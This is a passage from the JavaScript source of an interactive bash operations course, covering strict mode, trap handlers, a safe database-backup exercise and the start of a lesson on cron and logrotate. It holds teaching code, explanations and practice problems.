mkdir -p "$LOG_DIR"
LOG="$LOG_DIR/maint-$(date -u +%Y%m%dT%H%M%SZ).log"
exec > >(tee -a "$LOG") 2>&1          # everything below: screen + log

log() { printf '%s %s\n' "$(date -u +%FT%TZ)" "$*"; }

run_step() {                          # run_step NAME COMMAND [ARGS...]
  local name="$1" rc=0; shift
  log "step $name: start"
  if "$@"; then
    log "step $name: ok"
  else
    rc=$?
    log "step $name: FAILED (exit $rc)"
  fi
  return "$rc"
}

clean_cache()    { find /var/cache/app/tmp -mindepth 1 -mmin +60 -delete; }
vacuum_db()      { psql -X -q -c 'VACUUM ANALYZE' "\${DB_NAME:-appdb}"; }   # credentials come from ~/.pgpass or the environment
restart_worker() { systemctl restart app-worker && systemctl is-active --quiet app-worker; }

log "maint start (log: $LOG)"
find "$LOG_DIR" -maxdepth 1 -name 'maint-*.log' -mtime +30 -delete

failed=0
run_step clean_cache    clean_cache    || failed=1
run_step vacuum_db      vacuum_db      || failed=1
run_step restart_worker restart_worker || failed=1

log "maint end (status $failed)"
exit "$failed"`,
      cx: `<p>Logging adds a tee process and a few <code>date</code> calls: negligible. Disk use is bounded by the 30-day prune.</p>`,
      f: ['How would you send the same lines to the system journal so a central log shipper picks them up?', 'When would you rather stop at the first failed step than run all of them?']
    })]
  });

  // ───────────────────────── Topic 5: strict mode and traps ─────────────────────────
  topics.push({
    title: 'set -euo pipefail and trap: Scripts That Fail Loudly and Clean Up After Themselves',
    analogy: `<p>By default, bash is a <b>very polite assistant who never complains</b>. If step 3 of 10 fails, it shrugs and carries on with step 4, even if step 4 is "upload the backup" and the backup is empty. <code>set -euo pipefail</code> turns it into a <b>strict assistant</b>: stop at the first failure (<code>-e</code>), refuse to use a variable that was never set (<code>-u</code>), and count a failure anywhere in a pipe as a failure (<code>pipefail</code>). <code>trap</code> is the assistant's <b>"before you leave the room" checklist</b>: whatever happened, delete the scratch files and release the lock on the way out.</p>`,
    explain: `<p>🟢 <b>The real incident.</b> A nightly job ran <code>pg_dump appdb | gzip &gt; /backup/appdb.sql.gz</code> and then uploaded the file. After a password change, <code>pg_dump</code> failed every night, but <code>gzip</code> happily compressed the empty input and exited 0. A pipeline's exit code is the <b>last</b> command's code, so the script saw success and uploaded a 20-byte file. For three weeks. Nobody noticed until a restore was needed.</p>
      <p>🟢 <b>The three settings, one line at the top of almost every ops script:</b></p>
      ${H.table(['Setting', 'Effect', 'Catches'], [
        ['<code>set -e</code> (errexit)', 'exit at once when a command fails (non-zero) outside an if/while/&amp;&amp;/||', 'carrying on after a failed <code>cd</code>, <code>cp</code>, <code>curl</code>'],
        ['<code>set -u</code> (nounset)', 'using an unset variable is an error', 'typos (<code>$BACKUP_DRI</code>), missing config, the empty-variable <code>rm</code>'],
        ['<code>set -o pipefail</code>', 'a pipeline fails if <b>any</b> stage fails (code of the last failing one)', 'the hidden <code>pg_dump</code> failure above'],
        ['<code>set -x</code> (xtrace)', 'print each command before running it (to stderr)', 'debugging; turn on for a section, never around secrets']
      ])}
      <p>🟢 <b>trap: run code when the script ends or gets a signal.</b> <code>trap cleanup EXIT</code> runs the <code>cleanup</code> function whenever the script exits: normal end, <code>exit 1</code>, a <code>set -e</code> failure, or Ctrl+C. That is the place to remove temp files, release locks and print a final status. (CS Core 8 covers signals and <code>INT</code>/<code>TERM</code> traps in depth.)</p>
      <p>🔵 <b>Temp files done right.</b> <code>tmp="$(mktemp -d)"</code> creates a private folder with a random name (no clashes between two runs, no predictable path for an attacker to pre-create). Pair it with <code>trap 'rm -rf -- "$tmp"' EXIT</code> on the very next line, and you never leave junk in <code>/tmp</code> again.</p>
      <p>🔵 <b>trap ERR: say where it broke.</b> <code>trap 'echo "line $LINENO: $BASH_COMMAND failed" &gt;&amp;2' ERR</code> prints the line and the command that failed, just before <code>set -e</code> exits. Add <code>set -E</code> (errtrace) so the trap also fires inside functions. This one line turns "the backup job failed" into "line 42: aws s3 cp failed".</p>
      <p>🔵 <b>Where <code>set -e</code> does NOT stop you</b> (learn these, they are interview favourites):</p>
      <ul><li>Commands tested by <code>if</code>, <code>while</code>, <code>until</code>, or on the left of <code>&amp;&amp;</code> / <code>||</code>. Even inside a function called from an <code>if</code>, -e is switched off.</li>
      <li><code>local v=$(cmd)</code> and <code>export v=$(cmd)</code>: the status is that of <code>local</code>/<code>export</code>, always 0.</li>
      <li><code>(( count++ ))</code> when count is 0 returns 1, which <b>kills</b> a <code>set -e</code> script. Use <code>count=$(( count + 1 ))</code>.</li>
      <li>A command whose failure you expect (grep with no match) must be handled on purpose: <code>grep -q x f || true</code>, or put it in an <code>if</code>.</li></ul>`,
    clues: [
      '"the backup job reported success but the file was empty" → a pipe hid the failure: <code>set -o pipefail</code>, then verify the result',
      '"the script kept going after a failed cd / cp" → no <code>set -e</code>, or the command was inside <code>&amp;&amp;</code>/<code>||</code>/<code>if</code>',
      '"temp files pile up in /tmp" / "stale lock file after Ctrl+C" → <code>mktemp</code> plus <code>trap ... EXIT</code>',
      '"which line failed?" → <code>trap \'...$LINENO $BASH_COMMAND\' ERR</code> with <code>set -E</code>',
      '"typo in a variable name deleted the wrong thing" → <code>set -u</code> turns unset variables into errors',
      '"script dies silently in the middle" → under <code>-e</code>, a test like <code>(( n++ ))</code> or a grep with no match returned 1'
    ],
    code: [B`#!/usr/bin/env bash
# Lab: strict.sh - the standard header for an ops script. Run it, then edit FAIL_AT=2 to see the error path.
set -Eeuo pipefail

FAIL_AT="\${FAIL_AT:-0}"                 # 0 = everything works; 2 = step 2 fails

tmp="$(mktemp -d)"                       # private scratch folder
cleanup() {
  local rc=$?                            # the exit code the script is leaving with
  rm -rf -- "$tmp"
  echo "cleanup: removed scratch folder, exit code $rc" >&2
}
trap cleanup EXIT
trap 'echo "ERROR at line $LINENO: $BASH_COMMAND (exit $?)" >&2' ERR

step() { echo "step $1"; [[ $FAIL_AT != "$1" ]]; }   # returns 1 when this is the failing step

step 1; date -u > "$tmp/stamp"
step 2; cp "$tmp/stamp" "$tmp/copy"
step 3; wc -c < "$tmp/copy" | tr -d ' '
echo "all steps done"
# Output with FAIL_AT=0:            Output with FAIL_AT=2:
# step 1                            step 1
# step 2                            step 2
# step 3                            ERROR at line 16: [[ $FAIL_AT != "$1" ]] (exit 1)
# 29                                cleanup: removed scratch folder, exit code 1
# all steps done
# cleanup: removed scratch folder, exit code 0
# (set -E makes the ERR trap fire inside the step function, so it reports line 16, the test that failed.)`],
    codeTitle: ['Strict mode, a temp folder, an EXIT trap and an ERR trap'],
    viz: [{
      title: 'Which exit code does a pipeline return?',
      input: 'pg_dump=1 gzip=0',
      inputLabel: 'stages as name=exit code, in pipe order',
      gen: function (input) {
        var st = String(input || '').trim().split(/\s+/).filter(Boolean).map(function (p) {
          var m = p.match(/^([\w.-]+)=(\d{1,3})$/);
          if (!m || Number(m[2]) > 255) throw new Error('Use name=code pairs like: pg_dump=1 gzip=0');
          return { n: m[1], c: Number(m[2]) };
        });
        if (st.length < 2 || st.length > 5) throw new Error('Give 2-5 stages, e.g. pg_dump=1 gzip=0');
        var codes = st.map(function (s) { return s.c; }), names = st.map(function (s) { return s.n; });
        var lastCode = codes[codes.length - 1];
        var pf = 0; codes.forEach(function (c) { if (c !== 0) pf = c; });
        var line = names.join(' | ') + ' > /backup/out.gz';
        var hlBad = {}; codes.forEach(function (c, i) { if (c) hlBad[i] = 'bad'; else hlBad[i] = 'ok'; });
        var f = [];
        f.push({ narr: 'The nightly job runs <code>' + H.esc(line) + '</code>. Every stage is its own process and each one finishes with its own exit code.', parts: [
          { type: 'code', label: 'backup.sh', lang: 'bash', code: line + '\naws s3 cp /backup/out.gz s3://backups/', hl: { 1: 'cur' } }
        ] });
        f.push({ narr: 'Bash keeps every stage\'s code in the array <code>PIPESTATUS</code>. Here: <b>' + codes.join(' ') + '</b>. ' + (pf ? 'At least one stage failed.' : 'All stages succeeded.'), parts: [
          { type: 'array', label: 'PIPESTATUS', values: codes, idxLabels: names, hl: hlBad }
        ] });
        f.push({ narr: '<b>Without pipefail</b>, <code>$?</code> is the code of the <b>last</b> stage only: <b>' + lastCode + '</b>. ' + (lastCode === 0 && pf ? H.c('r', 'The script thinks the backup worked.') + ' The next line uploads a tiny, useless file, and the job "succeeds" every night.' : (lastCode ? 'Here the last stage failed, so even the default catches it.' : 'Correct this time, because nothing failed.')), parts: [
          { type: 'vars', label: 'default bash', vals: { '$?': lastCode, 'next line runs?': lastCode === 0 ? 'yes: upload' : 'only without set -e' }, hl: { '$?': lastCode === 0 && pf ? 'bad' : 'ok' } }
        ] });
        f.push({ narr: '<b>With <code>set -o pipefail</code></b>, the pipeline\'s code is the code of the <b>last stage that failed</b> (0 only if all succeeded): <b>' + pf + '</b>. ' + (pf ? 'With <code>set -e</code> as well, the script stops right here: no upload, a non-zero exit, and cron or monitoring can alert.' : 'Nothing failed, so the script carries on.'), parts: [
          { type: 'vars', label: 'set -euo pipefail', vals: { '$?': pf, 'next line runs?': pf ? 'no: script exits ' + pf : 'yes: upload' }, hl: { '$?': pf ? 'sel' : 'ok' } },
          { type: 'array', label: 'PIPESTATUS', values: codes, idxLabels: names, hl: hlBad }
        ] });
        f.push({ narr: 'pipefail tells you <b>that</b> something failed. A good backup script also checks the <b>result</b>: <code>gzip -t</code> to test the archive, a minimum size, and for databases a test restore now and then. A backup you have never restored is only a hope.', parts: [
          { type: 'code', label: 'safer', lang: 'bash', code: 'set -euo pipefail\n' + line + '\ngzip -t /backup/out.gz\n[[ $(stat -c %s /backup/out.gz) -gt 1024 ]] || { echo "backup too small" >&2; exit 1; }\naws s3 cp /backup/out.gz s3://backups/', hl: { 1: 'ok', 3: 'ok', 4: 'ok' } }
        ] });
        return f;
      }
    }, {
      title: 'trap EXIT and trap ERR, step by step',
      input: '3',
      inputLabel: 'which step fails: 1-4, or 0 for none',
      gen: function (input) {
        var k = Number(String(input || '0').trim());
        if (!(k >= 0 && k <= 4) || k % 1) throw new Error('Give a whole number from 0 to 4');
        var code = ['set -Eeuo pipefail', 'tmp="$(mktemp -d)"', "trap 'rm -rf -- \"$tmp\"' EXIT", "trap 'echo \"line $LINENO failed\" >&2' ERR", 'pg_dump appdb > "$tmp/db.sql"', 'gzip "$tmp/db.sql"', 'gzip -t "$tmp/db.sql.gz"', 'aws s3 cp "$tmp/db.sql.gz" s3://backups/', 'echo "backup ok"'].join('\n');
        var stepLine = { 1: 5, 2: 6, 3: 7, 4: 8 };
        var files = [], f = [];
        function st(h, vals, fl) { return [{ type: 'code', label: 'backup.sh', lang: 'bash', code: code, hl: h }, { type: 'vars', label: 'state', vals: vals }, { type: 'set', label: 'files in $tmp', items: fl.length ? fl.slice() : ['(empty)'] }]; }
        f.push({ narr: 'Line 1 switches on strict mode, line 2 creates a private scratch folder, and lines 3-4 register the traps <b>before</b> any real work. If the traps came later, a failure in between would leave junk behind.', parts: st({ 1: 'ok', 2: 'ok', 3: 'ok', 4: 'ok' }, { tmp: '/tmp/tmp.k3J9', 'EXIT trap': 'rm -rf $tmp', 'ERR trap': 'print line' }, files) });
        var names = ['pg_dump', 'gzip', 'gzip -t', 'aws s3 cp'];
        for (var s = 1; s <= 4; s++) {
          var ln = stepLine[s];
          if (s === k) {
            f.push({ narr: 'Line ' + ln + ' (<code>' + names[s - 1] + '</code>) <b>fails</b>. Before <code>set -e</code> exits, bash runs the <b>ERR</b> trap: it prints <code>line ' + ln + ' failed</code> to stderr. Now the log says exactly where it broke.', parts: st(one(ln, 'bad'), { '$?': 1, 'ERR trap': 'fired: line ' + ln + ' failed' }, files) });
            f.push({ narr: '<code>set -e</code> now ends the script. On the way out, the <b>EXIT</b> trap runs and deletes the scratch folder with the half-written files. Exit code: <b>1</b>, so cron mail, systemd or the CI job sees a failure. Line ' + (ln + 1) + ' onwards never runs.', parts: st(one(ln, 'bad'), { 'EXIT trap': 'fired: removed $tmp', 'exit code': 1 }, []) });
            return pad4(f, 'Whatever step fails, the same two traps run: ERR says where, EXIT cleans up. Try 0 to see the success path.');
          }
          if (s === 1) files.push('db.sql');
          if (s === 2) files = ['db.sql.gz'];
          f.push({ narr: 'Line ' + ln + ': <code>' + names[s - 1] + '</code> succeeds (exit 0), so the script moves on.' + (s === 3 ? ' The archive test passed, so we know the file is a valid gzip, not just "a file".' : ''), parts: st(one(ln, 'ok'), { '$?': 0 }, files) });
        }
        f.push({ narr: 'Every step worked: "backup ok" is printed. The script reaches its end, and the <b>EXIT</b> trap <b>still</b> runs, removing the local copy now that it is uploaded. EXIT fires on success and on failure, which is why it is the right place for cleanup.', parts: st({ 9: 'ok' }, { 'EXIT trap': 'fired: removed $tmp', 'exit code': 0 }, []) });
        return f;
      }
    }],
    examples: [
      { title: 'pipefail in one screen', html: `<p>A fake dump that writes some data and then fails stands in for <code>pg_dump</code>. Without pipefail the pipeline reports ${H.c('r', '0')}. <code>PIPESTATUS</code> shows the real story, and with pipefail the failure is visible. (<code>2&gt;/dev/null</code> on the run just hides the fake error message.)</p>`, code: B`#!/usr/bin/env bash
cd "$(mktemp -d)"
fake_dump() { echo "partial data"; echo "pg_dump: error: connection refused" >&2; return 1; }
fake_dump | gzip > backup.sql.gz
echo "without pipefail: \$?=$?"
fake_dump | gzip > backup.sql.gz
echo "PIPESTATUS: \${PIPESTATUS[*]}"
set -o pipefail
fake_dump | gzip > backup.sql.gz
echo "with pipefail:    \$?=$?"
# Output of: bash pf.sh 2>/dev/null
# without pipefail: $?=0
# PIPESTATUS: 1 0
# with pipefail:    $?=1` },
      { title: 'The (( count++ )) that killed a script', html: `<p>A health-check script counted failures with <code>(( failures++ ))</code>. It died silently the first time a host failed. <code>(( ))</code> returns exit code 1 when its expression is <b>0</b>, and post-increment returns the <b>old</b> value, 0. Under <code>set -e</code> that is a failure. The fix is <code>failures=$(( failures + 1 ))</code>.</p>`, code: B`#!/usr/bin/env bash
set -euo pipefail
count=0
echo "before"
(( count++ ))
echo "after (never printed: count++ returned 1 because the old value was 0)"
# Output (exit status 1):
# before` },
      { title: 'Where set -e looks away', html: `<p>Two traps in one script. <code>local v=$(false)</code> hides the failure because the line's status is that of <code>local</code>. And inside a function called from <code>if</code>, set -e is switched off for the whole function, so it carries on after <code>false</code>. The script ends with exit ${H.c('g', '0')} even though two commands failed. Write <code>local v; v=$(cmd)</code>, and do not rely on -e inside functions used as conditions.</p>`, code: B`#!/usr/bin/env bash
set -euo pipefail
get() { local v=$(false); echo "local hid the failure, v='$v'"; }
get
check() { false; echo "inside check: kept going after false, because check is called from if"; }
if check; then echo "check returned 0"; fi
# Output (exit status 0):
# local hid the failure, v=''
# inside check: kept going after false, because check is called from if
# check returned 0` },
      { title: 'ERR trap plus EXIT trap: a clear log and no leftovers', html: `<p>This is the pattern to copy into every operations script. The ERR trap names the line and command; the EXIT trap removes the temp folder on both success and failure. <code>-E</code> makes the ERR trap work inside functions too. (Temp paths are shown as XXXX.)</p>`, code: B`#!/usr/bin/env bash
set -Eeuo pipefail
tmp="$(mktemp -d)"
cleanup()  { rm -rf -- "$tmp"; echo "cleanup: removed $tmp" >&2; }
on_error() { echo "ERROR line $1: '$2' exited with $3" >&2; }
trap cleanup EXIT
trap 'on_error "$LINENO" "$BASH_COMMAND" "$?"' ERR
echo "working in $tmp"
touch "$tmp/part1"
cp "$tmp/does-not-exist" "$tmp/part2"
echo "never printed"
# Output (exit status 1):
# working in /tmp/tmp.XXXX
# cp: cannot stat '/tmp/tmp.XXXX/does-not-exist': No such file or directory
# ERROR line 10: 'cp "$tmp/does-not-exist" "$tmp/part2"' exited with 1
# cleanup: removed /tmp/tmp.XXXX` }
    ],
    deepDive: `<p>🟣 <b>set -e is a safety net, not error handling.</b> Its rules are full of exceptions (if/while conditions, <code>&amp;&amp;</code>/<code>||</code> lists, functions called from conditions, <code>local</code>/<code>export</code> assignments, commands inside <code>$( )</code> in older bash). Command substitutions inherit <code>-e</code> only with <code>shopt -s inherit_errexit</code> (bash 4.4+). So: keep <code>set -euo pipefail</code>, <b>and</b> check the results of the important steps explicitly (sizes, <code>gzip -t</code>, HTTP codes). Some experienced engineers skip <code>-e</code> and check every command by hand; both styles work if you are consistent.</p>
      <p><b>pipefail and SIGPIPE.</b> With pipefail, <code>producer | head -n 1</code> can fail: head exits after one line, and the producer is killed by SIGPIPE (exit 141) when it writes again. On big outputs this makes <code>yes | head -n 1</code> or <code>zcat big.gz | head</code> "fail" under pipefail. Handle it on purpose, for example <code>{ zcat big.gz || true; } | head</code> with a comment, or check <code>PIPESTATUS</code> and ignore 141 for that stage.</p>
      <p><b>Trap details.</b> Only one handler per signal: a second <code>trap ... EXIT</code> <b>replaces</b> the first, so keep one <code>cleanup</code> function and add to it. Inside the EXIT trap, <code>$?</code> is the exit code the script is leaving with; save it first (<code>local rc=$?</code>) and <code>exit "$rc"</code> if you run commands that change it. A trap runs only between commands: during a long <code>sleep 600</code> or a foreground child, bash waits for the child to finish first (use <code>cmd &amp; wait $!</code> if you must react at once). <code>SIGKILL</code> (kill -9) cannot be trapped, so a lock or temp folder can still be left behind; that is why <code>flock</code> (released by the kernel) beats a lock file, and why temp folders live under <code>/tmp</code> where they get cleaned eventually.</p>
      <p><b>Debugging with xtrace.</b> <code>bash -x script.sh</code>, or <code>set -x</code> ... <code>set +x</code> around one section. A better prompt for traces: <code>PS4='+ &#36;{BASH_SOURCE##*/}:&#36;{LINENO}: '</code> shows file and line (note: that line belongs in your script, where bash expands it). <code>BASH_XTRACEFD=3</code> sends the trace to a separate file. <span class="c-r">Never</span> trace a section that handles tokens: xtrace prints the expanded command, secret included, into your log.</p>
      <p><b>Is <code>set -euo pipefail</code> always right?</b> For scripts that do a sequence of steps, yes. For interactive shells (your <code>.bashrc</code>), no: the first failed command would close your terminal. For scripts that are mostly loops of "try this host, report, continue", use <code>set -uo pipefail</code> and handle each failure yourself, as the maintenance script in the previous topic does.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> almost every AI-generated bash script now starts with <code>set -euo pipefail</code>. That is good, but it gives a false sense of safety: the header is there while the script still ignores the result of the important steps. Assistants are useful for spotting the classic traps if you ask directly: "under set -e, which lines in this script can fail without stopping it?"</p>
      <p><b>Where it goes wrong:</b> AI scripts often add <code>|| true</code> after commands to "fix" set -e errors, which brings back the silent failures; they put cleanup at the end of the script instead of in a trap; they create temp files with fixed names like <code>/tmp/backup.tmp</code> (clashes and symlink attacks); and they add <code>set -x</code> in scripts that read tokens. <b>Your job:</b> question every <code>|| true</code> (each needs a comment saying why the failure is fine), insist on <code>mktemp</code> plus an EXIT trap, and verify outputs, because pipefail cannot tell you that a "successful" dump is empty.</p>`,
    problems: [P({
      t: 'The backup that silently failed for three weeks', l: 'Medium', tags: ['pipefail', 'trap', 'mktemp', 'backup'], co: ['GitLab', 'Shopify'],
      s: `<p>This is the nightly database backup from the story above. After a credentials change, every run uploaded an almost empty file and "succeeded". Rewrite it so that a failed dump can <b>never</b> be uploaded, a half-written file can never replace a good one, temp files are always cleaned up, and the log says which step failed.</p>
<pre>#!/bin/bash
pg_dump appdb | gzip &gt; /backup/appdb.sql.gz
aws s3 cp /backup/appdb.sql.gz s3://acme-backups/db/
echo "backup ok"</pre>
<p>Database credentials come from <code>~/.pgpass</code> or the <code>PG*</code> environment variables; S3 access comes from the instance role. Neither may appear in the script.</p>`,
      ex: `<p>Dump fails: the log shows pg_dump's own message, then ${H.c('r', 'ERROR line 23: gzip -c &gt; "$tmp/$DB_NAME.sql.gz" (exit 1)')}. (<code>$BASH_COMMAND</code> names the last stage of the pipe, but the exit code 1 comes from pg_dump thanks to pipefail.) Nothing is uploaded, yesterday's local backup is untouched, the temp folder is gone, exit status 1. Dump works: the archive passes <code>gzip -t</code>, is larger than the minimum size, is moved into place, uploaded as <code>appdb-2026-03-02T0300Z.sql.gz</code>, and the script prints ${H.c('g', 'backup ok')}.</p>`,
      bw: `<p>The original has three problems. The pipe returns gzip's code, so a dead <code>pg_dump</code> looks like success. It writes straight to the final file, so a failed run <b>overwrites</b> yesterday's good backup with garbage. And it never checks the result, so "the command did not fail" is mistaken for "we have a backup".</p>`,
      bc: B`#!/bin/bash
pg_dump appdb | gzip > /backup/appdb.sql.gz       # exit code = gzip's, almost always 0
aws s3 cp /backup/appdb.sql.gz s3://acme-backups/db/
echo "backup ok"`,
      q: ['Why write the dump to a temp file and <code>mv</code> it into place only after checks pass?', ['So a failed or partial run never overwrites the last good backup', 'Because mv compresses the file', 'Because S3 cannot upload from /backup', 'To make the script run faster'], 0, 'mv within one filesystem is atomic: the final name points either at the old good file or the new checked one, never at a half-written file. Writing directly to the final path destroys yesterday\'s backup the moment a bad run starts.'],
      h: ['<p>Hint 1: start with <code>set -Eeuo pipefail</code>, an ERR trap that logs <code>$LINENO</code> and <code>$BASH_COMMAND</code>, and read the database name and bucket from the environment with <code>:?</code> guards.</p>', '<p>Hint 2: dump into <code>mktemp</code> space <b>on the same filesystem</b> as <code>/backup</code> (so <code>mv</code> is atomic), with an EXIT trap that removes it. Check it with <code>gzip -t</code> and a minimum size before moving.</p>', '<p>Hint 3: put a UTC timestamp in the uploaded name so one bad night cannot overwrite older copies in S3, and keep a lock (<code>flock -n</code>) so two runs never overlap.</p>'],
      a: `<p>Strict mode plus an ERR trap means any failing stage, including <code>pg_dump</code> inside the pipe, stops the script and logs the line. Config comes from the environment (<code>DB_NAME</code>, <code>BACKUP_BUCKET</code>) with guards; credentials come from <code>.pgpass</code>/PG variables and the instance role, so the script contains no secrets. <code>flock -n</code> on a lock file prevents overlapping runs. The dump goes to a temp folder inside <code>/backup</code>, cleaned up by an EXIT trap. Before anything is replaced, two checks: <code>gzip -t</code> (valid archive) and a minimum size. Only then is it <code>mv</code>ed into place atomically and uploaded under a timestamped key. The final line runs only if everything above succeeded.</p>`,
      code: B`#!/usr/bin/env bash
# backup-db.sh - nightly PostgreSQL backup that can not fail silently
# Config:  DB_NAME, BACKUP_BUCKET (env).  Credentials: ~/.pgpass or PG* env, S3 via instance role.
set -Eeuo pipefail

DB_NAME="\${DB_NAME:?set DB_NAME}"
BUCKET="\${BACKUP_BUCKET:?set BACKUP_BUCKET, e.g. s3://acme-backups/db}"
BACKUP_DIR="\${BACKUP_DIR:-/backup}"
MIN_BYTES="\${MIN_BYTES:-10240}"           # a real dump of this DB is never smaller than 10 KB

log() { printf '%s backup-db: %s\n' "$(date -u +%FT%TZ)" "$*" >&2; }
trap 'log "ERROR line $LINENO: $BASH_COMMAND (exit $?)"' ERR

# One run at a time: the kernel releases the lock even if we are killed
exec 9> "$BACKUP_DIR/.backup-db.lock"
flock -n 9 || { log "another backup is running, exiting"; exit 1; }

tmp="$(mktemp -d "$BACKUP_DIR/.tmp.XXXXXX")"   # same filesystem as the final file
trap 'rm -rf -- "$tmp"' EXIT

stamp="$(date -u +%Y-%m-%dT%H%MZ)"
log "dumping $DB_NAME"
pg_dump --no-password "$DB_NAME" | gzip -c > "$tmp/$DB_NAME.sql.gz"

log "verifying"
gzip -t "$tmp/$DB_NAME.sql.gz"
size="$(stat -c %s "$tmp/$DB_NAME.sql.gz")"
if (( size < MIN_BYTES )); then
  log "dump is only $size bytes (minimum $MIN_BYTES), refusing to keep it"
  exit 1
fi

mv -f -- "$tmp/$DB_NAME.sql.gz" "$BACKUP_DIR/$DB_NAME.sql.gz"   # atomic replace
log "uploading $size bytes"
aws s3 cp --only-show-errors "$BACKUP_DIR/$DB_NAME.sql.gz" "$BUCKET/$DB_NAME-$stamp.sql.gz"
log "backup ok: $BUCKET/$DB_NAME-$stamp.sql.gz"`,
      cx: `<p>Dump time is unchanged; the checks add one read of the archive (<code>gzip -t</code>), roughly a few seconds per GB. Disk needs room for one extra copy during the run.</p>`,
      f: ['How would you prove the backup can actually be restored, not just unzipped?', 'What would you alert on so that a job which stops running at all (not just failing) is noticed?']
    })]
  });

  // ───────────────────────── Topic 6: cron and log rotation ─────────────────────────
  topics.push({
    title: 'Cron Jobs and Log Rotation: Scheduled Work That Runs at 3 a.m. Without You',
    analogy: `<p>Cron is a <b>night-shift worker with an alarm clock and almost no context</b>. You leave a note: "at 02:30 every day, run the backup". The worker wakes up, reads only the note, and does exactly that. It does <b>not</b> know your shell settings, your <code>PATH</code>, which folder you were in, or the variables you exported in your terminal. If the note says <code>backup.sh</code> instead of <code>/opt/scripts/backup.sh</code>, the worker shrugs: "command not found". Log rotation is the <b>janitor</b> on the same shift: every night, it boxes up yesterday's logs, labels them, and throws out the oldest boxes so the room never overflows.</p>`,
    explain: `<p>🟢 <b>The crontab line: five time fields, then the command.</b></p>
      ${H.table(['Field', 'Allowed', 'Example', 'Meaning'], [
        ['minute', '0-59', '<code>*/15</code>', 'every 15 minutes (0, 15, 30, 45)'],
        ['hour', '0-23', '<code>2</code>', 'at 02:xx'],
        ['day of month', '1-31', '<code>1</code>', 'on the 1st'],
        ['month', '1-12', '<code>*</code>', 'every month'],
        ['day of week', '0-7 (0 and 7 = Sunday)', '<code>1-5</code>', 'Monday to Friday']
      ])}
      <p>So <code>30 2 * * *</code> is "02:30 every day" and <code>*/10 * * * 1-5</code> is "every 10 minutes on weekdays". <code>,</code> makes a list (<code>0 8,20 * * *</code>), <code>-</code> a range, <code>/</code> a step. Shortcuts: <code>@daily</code>, <code>@hourly</code>, <code>@reboot</code>. Times are in the server's time zone, which on cloud VMs is usually <b>UTC</b>.</p>
      <p>🟢 <b>Where cron jobs live.</b> <code>crontab -e</code> edits <b>your</b> crontab (lines have no user field). <code>/etc/crontab</code> and files in <code>/etc/cron.d/</code> have a <b>sixth field: the user</b> (<code>30 2 * * * backup /opt/scripts/backup.sh</code>). <code>/etc/cron.daily/</code> holds scripts run once a day. <code>crontab -l</code> lists. Did it run? <code>grep CRON /var/log/syslog</code> or <code>journalctl -u cron</code> on Ubuntu, <code>/var/log/cron</code> on RHEL.</p>
      <p>🔵 <b>Why "it works by hand but not from cron".</b> Cron runs your command with a tiny environment:</p>
      ${H.table(['Thing', 'Your terminal', 'Under cron'], [
        ['<code>PATH</code>', '/usr/local/bin:/usr/bin:/bin:/snap/bin:...', '<b>/usr/bin:/bin</b> → exit 127 for aws, node, kubectl in /usr/local/bin or /snap/bin'],
        ['shell', 'bash with your <code>.bashrc</code>', '<b>/bin/sh</b> (dash on Ubuntu), no .bashrc, no aliases'],
        ['current folder', 'wherever you were', 'the user\'s <b>home</b> folder'],
        ['your exported variables', 'set', '<b>not set</b> (tokens, AWS_PROFILE, proxies)'],
        ['output', 'your screen', 'mailed (if mail is set up) or <b>lost</b>'],
        ['<code>%</code> in the command', 'a normal character', '<b>a newline</b>: <code>date +%F</code> breaks; write <code>\\%</code>']
      ])}
      <p>The cure: cron should call <b>one script</b> by absolute path. The script sets its own <code>PATH</code>, <code>cd</code>s where it needs to be, reads config from a file it names explicitly, uses <code>set -euo pipefail</code>, and the cron line sends output to a log: <code>30 2 * * * /opt/scripts/backup.sh &gt;&gt; /var/log/backup.log 2&gt;&amp;1</code>. Add <code>flock -n</code> so a slow run is never overlapped by the next one.</p>
      <p>🔵 <b>Log rotation with logrotate.</b> Logs grow forever unless something rotates them. <code>logrotate</code> (run daily by a systemd timer or <code>/etc/cron.daily</code>) reads <code>/etc/logrotate.d/*</code>:</p>
      ${H.table(['Directive', 'Meaning'], [
        ['<code>daily</code> / <code>weekly</code> / <code>size 100M</code>', 'when to rotate'],
        ['<code>rotate 14</code>', 'keep 14 old files, delete older'],
        ['<code>compress</code> + <code>delaycompress</code>', 'gzip old logs, but leave the newest old one (.1) plain for one more cycle'],
        ['<code>missingok</code>, <code>notifempty</code>', 'no error if the log is missing; skip empty logs'],
        ['<code>create 0640 app adm</code>', 'make a fresh empty log with this mode and owner after moving the old one'],
        ['<code>copytruncate</code>', 'copy then empty the file in place, for apps that cannot reopen their log'],
        ['<code>postrotate ... endscript</code>', 'command after rotation, e.g. <code>systemctl reload nginx</code> so it reopens its log']
      ])}
      <p>Test with <code>sudo logrotate -d /etc/logrotate.d/myapp</code> (dry run, shows what it would do) and <code>-f</code> (force a rotation now).</p>`,
    clues: [
      '"works when I run it, fails from cron" → PATH, /bin/sh, working directory, missing env vars, <code>%</code>; capture output to a log to see the error',
      '"exit status 127 in cron mail" → command not found: absolute paths or <code>PATH=</code> in the script',
      '"the job ran twice at once and corrupted data" → overlapping runs: <code>flock -n /run/lock/job.lock</code>',
      '"disk filled with logs" / "a 40 GB log file" → logrotate rule (or app-level rotation), test with <code>logrotate -d</code>',
      '"rotated but the app keeps writing to the old file" → the app holds the file open: <code>postrotate</code> reload/HUP, or <code>copytruncate</code>',
      '"run at 9 a.m. local time" → servers run in UTC: convert, or use a systemd timer / CRON_TZ where supported'
    ],
    code: [B`#!/usr/bin/env bash
# /opt/scripts/report.sh - a cron-proof job. Install with:
#   sudo install -m 755 report.sh /opt/scripts/report.sh
#   crontab -e   and add the line below (note: no % signs on the cron line itself)
#   */15 * * * * /opt/scripts/report.sh >> "$HOME/report.log" 2>&1
set -euo pipefail

# 1. Never trust cron's environment: set what you need.
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cd "$(dirname "$(realpath "$0")")"          # work next to the script, not in $HOME

# 2. Config from a file you name, not from your interactive shell
CONFIG="\${CONFIG:-/etc/report.env}"         # e.g. REPORT_DIR=/var/reports
if [[ -r $CONFIG ]]; then . "$CONFIG"; fi
REPORT_DIR="\${REPORT_DIR:-/tmp/reports}"

# 3. One run at a time: if the last run is still going, skip this one
exec 9> "/tmp/report.lock"
flock -n 9 || { echo "$(date -u +%FT%TZ) previous run still active, skipping"; exit 0; }

# 4. The actual work, with timestamps so the log is readable
echo "$(date -u +%FT%TZ) start (user=$(id -un), shell=$0, PATH=$PATH)"
mkdir -p "$REPORT_DIR"
